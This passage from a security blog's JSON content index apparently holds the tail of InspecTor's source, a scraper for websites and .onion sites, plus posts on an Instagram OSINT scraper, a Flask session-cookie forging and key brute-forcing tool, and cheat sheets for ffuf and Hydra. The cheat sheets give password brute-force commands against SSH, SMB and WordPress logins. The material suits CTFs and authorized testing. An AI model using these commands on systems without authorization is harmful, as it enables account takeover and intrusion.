\u0026#39;\u0026#39;), json.dumps(metadata.get(\u0026#39;server_technologies\u0026#39;, {})), json.dumps(metadata.get(\u0026#39;crypto_wallets\u0026#39;, {})), json.dumps(metadata.get(\u0026#39;links\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;emails\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;external_links\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;http_headers\u0026#39;, {})), json.dumps(metadata.get(\u0026#39;phone_numbers\u0026#39;, [])) )) conn.commit() def print_human_readable(metadata_list): \u0026#34;\u0026#34;\u0026#34; Print metadata results in a more human-readable format. Uses colors to distinguish keys and values, skipping empty fields. \u0026#34;\u0026#34;\u0026#34; for metadata in metadata_list: print(Fore.CYAN + \u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34; * 80 + \u0026#34;\\n\u0026#34;) for key, value in metadata.items(): if value: if isinstance(value, dict): print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:\u0026#34; + Style.RESET_ALL) for sub_key, sub_value in value.items(): if sub_value: print(f\u0026#34; {Fore.GREEN}{sub_key}:{Style.RESET_ALL} {sub_value}\u0026#34;) elif isinstance(value, list): print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:\u0026#34; + Style.RESET_ALL) for item in value: if item: if isinstance(item, dict): for sub_key, sub_value in item.items(): if sub_value: print(f\u0026#34; {Fore.GREEN}{sub_key}:{Style.RESET_ALL} {sub_value}\u0026#34;) else: print(f\u0026#34; - {Fore.WHITE}{item}{Style.RESET_ALL}\u0026#34;) else: print(Fore.YELLOW + f\u0026#34;{key.capitalize()}:{Style.RESET_ALL} {Fore.WHITE}{value}{Style.RESET_ALL}\u0026#34;) print(Fore.CYAN + \u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34; * 80) def main(): \u0026#34;\u0026#34;\u0026#34; The main function orchestrates: 1. Argument parsing and validation. 2. URL loading and validation. 3. Checking Tor availability if needed. 4. Setting up the database. 5. Concurrently extracting metadata from URLs. 6. Saving results to JSON or stdout. 7. Optionally printing results in a human-readable format. \u0026#34;\u0026#34;\u0026#34; setup_logging() parser = setup_argparser() args = parser.parse_args() # Load URLs from command line or file if args.urls: urls = args.urls else: urls = load_urls_from_file(args.file) # Validate URLs and normalize them valid_urls = [] for url in urls: normalized_url = url.rstrip(\u0026#39;/\u0026#39;) if is_valid_url(normalized_url): valid_urls.append(normalized_url) else: logging.warning(f\u0026#34;Invalid URL skipped: {url}\u0026#34;) if not valid_urls: logging.error(\u0026#34;No valid URLs provided. Exiting.\u0026#34;) sys.exit(1) # Determine fields to extract if args.extract_all: fields = list({ \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;http_headers\u0026#39;, \u0026#39;phone_numbers\u0026#39; }) elif args.fields: fields = args.fields else: fields = None # Check if Tor is required tor_required = any(urlparse(u).netloc.endswith(\u0026#39;.onion\u0026#39;) for u in valid_urls) or args.force_tor if tor_required and not is_tor_port_open(): logging.error(\u0026#34;Tor SOCKS5 proxy is not accessible. Please ensure Tor is running.\u0026#34;) sys.exit(1) # Set up database connection conn = setup_database(args.database) # Use ThreadPoolExecutor for concurrency results = [] with ThreadPoolExecutor(max_workers=args.max_workers) as executor: future_to_url = { executor.submit( extract_metadata, url, args, fields, default_region=args.default_region ): url for url in valid_urls } for future in as_completed(future_to_url): url = future_to_url[future] try: metadata = future.result() if metadata: save_to_database(conn, metadata) results.append(metadata) else: logging.error(f\u0026#34;Failed to extract metadata for {url}\u0026#34;) except Exception as exc: logging.error(f\u0026#34;{url} generated an exception: {exc}\u0026#34;) # Save results to file or stdout try: if args.output == \u0026#39;-\u0026#39;: # Print to stdout as JSON json.dump(results, sys.stdout, indent=4) else: # Save to a file in JSON format with open(args.output, \u0026#39;w\u0026#39;) as f: json.dump(results, f, indent=4) logging.info(f\u0026#34;Metadata extraction completed. Results saved to \u0026#39;{args.output}\u0026#39;.\u0026#34;) except Exception as e: logging.error(f\u0026#34;Error saving results to \u0026#39;{args.output}\u0026#39;: {e}\u0026#34;) # Print human-readable output if requested if args.human_readable: print(\u0026#34;\\nHuman-readable Output:\u0026#34;) print_human_readable(results) # Close the database connection conn.close() if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch1 id=\"inspector-metadata-extraction-from-websites\"\u003eInspecTor: Metadata Extraction from Websites\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003eInspecTor\u003c/strong\u003e is a command-line tool designed for extracting metadata from websites, including \u003cstrong\u003e\u003ccode\u003e.onion\u003c/code\u003e\u003c/strong\u003e domains, while maintaining anonymity through the Tor network. This tool provides a straightforward way to gather information such as emails, phone numbers, links, images, and more, making it useful for cybersecurity researchers, investigators, and analysts. Its ability to handle dynamic content with Selenium and process multiple URLs concurrently adds flexibility and efficiency to metadata collection.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge—I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e—I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; 